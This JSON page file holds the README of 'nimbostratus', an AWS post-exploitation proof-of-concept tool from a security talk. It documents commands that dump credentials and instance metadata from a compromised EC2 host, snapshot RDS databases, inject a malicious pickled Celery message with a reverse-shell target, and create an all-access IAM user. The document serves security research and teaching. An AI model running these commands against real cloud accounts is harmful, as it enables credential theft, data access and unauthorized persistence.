{"name":"Nimbostratus","tagline":"Tools for fingerprinting and exploiting Amazon cloud infrastructures","body":"Nimbostratus\r\n============\r\n\r\nTools for fingerprinting and exploiting Amazon cloud infrastructures. These tools are a PoC\r\nwhich I developed for my \"Pivoting in Amazon clouds\" talk, developed using the great \r\n[boto](https://github.com/boto/boto) library for accessing Amazon's API.\r\n\r\nFeel free to report bugs, fork and send pull-requests. You can also drop me a line at\r\n[@w3af](https://twitter.com/w3af).\r\n\r\nInstallation\r\n============\r\n\r\n```bash\r\ngit clone git@github.com:andresriancho/nimbostratus.git\r\ncd nimbostratus\r\npip install -r requirements.txt\r\n```\r\n\r\n\r\nUsage\r\n=====\r\n\r\nProviding AWS credentials\r\n-------------------------\r\n\r\nSome `nimbostratus` sub-commands require you to provide AWS credentials. They are\r\nprovided using the following command line arguments:\r\n\r\n * `--access-key`\r\n * `--secret-key`\r\n * `--token` , which is only used when the credentials were extracted from the instance profile.\r\n\r\nDump credentials\r\n----------------\r\n\r\nIdentify the credentials available in this host and prints them out to the console.\r\nThis is usually the first command to run after gaining access to an EC2 instance.\r\n\r\n```console\r\n$ nimbostratus dump-credentials\r\n...\r\n```\r\n\r\nOnce you've got the credentials from an EC2 instance you've exploited, you can continue to work from any other\r\nhost with internet access (remember: EC2 instances are in many cases spawned for a specific work and then terminated).\r\n\r\n*IMPORTANT*: This will extract information from `boto`'s credential configuration sources\r\nand from the instance meta-data. If the system uses other libraries to connect to AWS\r\nthe credentials won't be dumped.\r\n\r\n\r\nDump permissions\r\n----------------\r\n\r\nThis tool will dump all permissions for the provided credentials. This tool is commonly used\r\nright after `dump-credentials` to know which permissions are available for you.\r\n\r\n```console\r\n$ nimbostratus dump-permissions --access-key=... --secret-key=...\r\n...\r\n```\r\n\r\nDump instance meta-data\r\n-----------------------\r\n\r\nAll EC2 instances have [meta-data](http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/AESDG-chapter-instancedata.html)\r\nwhich is accessible via [http://169.254.169.254/latest/meta-data/](http://169.254.169.254/latest/meta-data/). This\r\ntool will extract all the important information from the metadata and show it to you.\r\n\r\nKeep in mind that each EC2 instance has his own `http://169.254.169.254/` meta-data\r\nprovider and running this command on different instances will yield different results.\r\n\r\n```console\r\n$ nimbostratus dump-ec2-metadata\r\n...\r\n```\r\n\r\nCreate DB snapshot\r\n------------------\r\n\r\nIn some cases you've got Amazon credentials which allow you to access the [RDS](http://aws.amazon.com/rds/) API but\r\ndon't have any access to the database itself (MySQL user). This tool allows you to access the information stored in\r\nthat database by creating a snapshot and restoring it.\r\n\r\n```console\r\n$ nimbostratus snapshot-rds --access-key=... --secret-key=... \\\r\n                            --password=changeme --rds-name==db_name\r\n...\r\n```\r\n\r\nInject raw Celery message\r\n-------------------------\r\n\r\nCelery warns developers about the [insecure pickle](http://docs.celeryproject.org/en/latest/userguide/security.html#serializers)\r\nserialization method, but of course you'll find deployments like this in real life. This tool will check if the instance\r\nwhere this tool is being run has access to SQS, if that SQS has a Celery queue, verify that the Queue is using pickle and\r\nfinally inject a raw message that will execute arbitrary commands when un-pickled.\r\n\r\n```console\r\n$ nimbostratus celery-pickle-exploit --access-key=... --secret-key=... \\\r\n                                     --queue-name=celery --region=ap-southeast-1 \\\r\n                                     --reverse=1.2.3.4:4000\r\n...\r\n```\r\n\r\nCreate new user\r\n---------------\r\n\r\nIf you've got credentials which allow you to create a new user using [IAM](http://aws.amazon.com/iam/) this tool will\r\ncreate it (with permissions to access all Amazon resources) and return API key and secret.\r\n\r\n```console\r\n$ nimbostratus create-iam-user --access-key=... --secret-key=...\r\n...\r\n```\r\n\r\n\r\n\r\nWhat's a `nimbostratus` anyways?\r\n================================\r\n\r\n[nimbostratus](http://en.wikipedia.org/wiki/Nimbostratus_cloud) is a type of cloud, if you ever started a project you know how hard it is to name it... so I just chose something that sounded \"cool\" and was \"cloud-related\".\r\n","google":"","note":"Don't delete this file! It's used internally to help with page regeneration."}